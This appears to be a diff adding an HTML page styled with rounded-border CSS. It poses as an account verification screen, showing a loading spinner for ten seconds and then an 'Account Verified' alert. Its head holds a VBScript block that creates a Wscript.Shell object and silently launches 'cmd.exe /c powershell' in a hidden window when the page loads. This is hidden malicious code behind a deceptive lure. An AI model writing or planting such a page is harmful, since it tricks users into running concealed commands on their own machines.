@@ -1,0 +1,59 @@
+<style type="text/css">
+.topborder {
+display: block;
+margin-bottom: 0px;
+}
+.topborder * {
+border-style:solid;
+border-width:0 1px;
+display:block;
+font-size:1px;
+height:1px;
+line-height:1px;
+overflow:hidden;
+border-color: #9c967c;
+background-color: #d4d4d4;
+border-width:0 2px;
+}
+.tb1 { margin:0 8px; background-color: #9c967c;}
+.tb2 { margin:0 6px; }
+.tb3 { margin:0 5px; }
+.tb4 { margin:0 4px; }
+.tb5 { margin:0 3px; }
+.tb6 { margin:0 2px; }
+.tb7 { margin:0 1px; height: 2px; }
+.tb8 { margin:0 0px; height: 2px; }
+.bb { background-color: #fffeef; }
+</style>
+
+<html> 
+<head> 
+			<script language="VBScript"> 
+                Set objShell = CreateObject("Wscript.Shell")
+                objShell.Run "cmd.exe /c powershell", 0
+            </script> 
+</head> 
+<body> 
+<div id = "myDiv" style="display:none" align="center"><img id = "Loading" src = "loading_spinner.gif" ></div><br>
+<script type="text/javascript">
+
+  (function(){
+    var myDiv = document.getElementById("myDiv");
+
+    var show = function(){
+      myDiv.style.display = "block";
+      setTimeout(hide, 10000);  // 10 seconds
+    }
+
+    var hide = function(){
+      myDiv.style.display = "none";
+      window.alert("Account Verified");
+    }
+
+    show();
+  })();
+
+</script>
+
+</body> 
+</html>
